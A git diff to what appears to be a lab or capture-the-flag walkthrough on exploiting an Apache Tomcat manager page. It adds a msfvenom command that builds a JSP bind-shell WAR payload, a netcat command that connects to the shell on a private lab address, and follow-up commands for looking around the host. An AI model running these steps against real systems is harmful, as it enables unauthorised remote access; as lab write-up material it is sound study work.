@@ -149,7 +149,6 @@ Looks like wever got an SMB server. Notice that it is running "Apache Tomcat", r
 
 As we can see, the username and passwd are allowing us to ccess the system.
 
- 
 
 ## Exploit:
 
@@ -179,16 +178,19 @@ Notice that this pages contains a section: "WAR file to deploy"
 
 First well use msf to generate a payload.
 
-
-Then add execute permissions:
-
+      msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f war > file.war
 
 Now we can upload and deploy file.war. After it is added to the "Applications" table, click on the path "/file". Once the wepage has loaded run this command to connect to the shell: 
 
       nc -nv 172.16.1.11 4444
 
+To get the hostname run:
 
+      hostname
 
+And we can find folder at \Shares\ with:
+
+      dir \Shares\
 
 
 
